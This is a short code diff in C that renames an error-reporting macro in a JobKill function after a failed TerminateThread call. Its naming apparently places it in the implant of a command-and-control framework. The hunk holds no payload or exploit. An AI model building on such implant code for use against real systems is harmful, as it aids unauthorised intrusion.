@@ -190,7 +190,7 @@ BOOL JobKill( DWORD JobID )
                     {
                         PRINTF( "TerminateThread NtStatus:[%ul]\n", NtStatus )
                         NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
-                        SEND_WIN32_BACK;
+                        CALLBACK_GETLASTERROR;
                         return FALSE;
                     }
                     else
